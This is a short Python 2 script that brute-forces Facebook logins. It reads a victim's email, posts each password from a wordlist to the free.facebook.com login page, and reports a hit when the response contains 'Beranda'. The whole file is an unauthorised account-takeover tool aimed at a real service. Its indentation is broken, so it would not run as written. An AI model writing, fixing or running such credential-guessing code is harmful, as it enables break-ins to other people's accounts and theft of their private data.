import requests
import sys

email = raw_input("email_> ")

url='https://free.facebook.com/login.php'
ex = open('wordlist.txt', 'r').readlines()

for line in ex:
     password = line.strip()
     http = requests.post(url, data={'email':email, 'pass': password, 'login':'sumbmit'})
     content = http.content
    if "Beranda" in content:
    print "[+] password found ",password
    sys.exit(1)
 else:
print "[!] password invalid ",password